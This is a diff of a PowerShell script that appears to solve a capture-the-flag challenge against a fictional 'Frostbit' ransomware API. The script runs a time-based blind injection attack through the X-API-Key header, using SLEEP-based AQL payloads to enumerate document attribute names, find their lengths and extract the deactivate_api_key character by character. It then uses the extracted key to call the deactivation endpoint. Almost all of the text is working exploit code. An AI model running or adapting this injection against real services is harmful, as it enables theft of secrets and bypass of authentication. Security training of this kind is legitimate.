@@ -142,30 +142,33 @@ $len = 0
 
 "Starting Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
 
-"`nTrying to find attribute names in doc : "
-$list = Get-Content -Path key-candidates.txt
-foreach($key in $list) {
+# If key-candidates.txt exists try brute-forcing the key name search with the list of possible key names.
+# One key name per line.  Add known names such as: _id, _key, along with unknowns such as: blah, frostbit, etc.
+if(Test-Path -Path key-candidates.txt){
+    "`nTrying brute force search for attribute names in doc : "
+    $list = Get-Content -Path key-candidates.txt
+    foreach($key in $list) {
+        
+        $apikey = "`' OR `"$key`" IN ATTRIBUTES(doc) ? SLEEP($sleepytime) : `'"
     
-    $apikey = "`' OR `"$key`" IN ATTRIBUTES(doc) ? SLEEP($sleepytime) : `'"
-
-    $sw = [Diagnostics.Stopwatch]::StartNew()
-
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
-    -WebSession $session `
-    -SkipHttpErrorCheck `
-    -Headers @{
-    "X-API-Key"="$apikey"
-    }).Content | ConvertFrom-Json
-
-    $sw.Stop()
-    if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-        "Found: " + $key
-    }
-    else{
-        "Not Found: " + $key
+        $sw = [Diagnostics.Stopwatch]::StartNew()
+    
+        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+        -WebSession $session `
+        -SkipHttpErrorCheck `
+        -Headers @{
+        "X-API-Key"="$apikey"
+        }).Content | ConvertFrom-Json
+    
+        $sw.Stop()
+        if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
+            "Found: " + $key
+        }
+        else{
+            "Not Found: " + $key
+        }
     }
 }
-
 
 "`nTrying to find count of attribute names (keys) in doc including system keys: "
 1..10 | % {
@@ -258,7 +261,7 @@ foreach($pos in 0..$len){
 
 "`nTrying to find length of the attribute value in doc.deactivate_api_key: "
 0..64 | % {
-    $apikey = "`' OR LENGTH(doc.deactivate_api_key) == $_ ? SLEEP($sleepytime) : `'"
+    $apikey = "`' OR LENGTH(doc.$name) == $_ ? SLEEP($sleepytime) : `'"
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
@@ -277,11 +280,11 @@ foreach($pos in 0..$len){
     }
 }
 
-$name = ""
+$value = ""
 "`nTrying to find the grand-prize, the value of deactivate_api_key: "
 foreach($pos in 0..$len){
     foreach($letter in $letters){
-        $apikey = "`' OR SUBSTRING(doc.deactivate_api_key, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
+        $apikey = "`' OR SUBSTRING(doc.$name, $pos, 1) == `"$letter`" ? SLEEP($sleepytime) : `'"
     
         $sw = [Diagnostics.Stopwatch]::StartNew()
     
@@ -295,14 +298,14 @@ foreach($pos in 0..$len){
         $sw.Stop()
     
         if($sw.ElapsedMilliseconds -ge $sleeperrormargin){
-            $name += $letter
+            $value += $letter
             break
         }
     }
 }
-"Found: " + $name
+"Found: " + $value
 
-$apikey = $name
+$apikey = $value
 "`nAttempting to deactivate the ransomware infrastructure from publishing our data:"
 "Setting HTTP header X-API-Key: $apikey"
 "Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true"
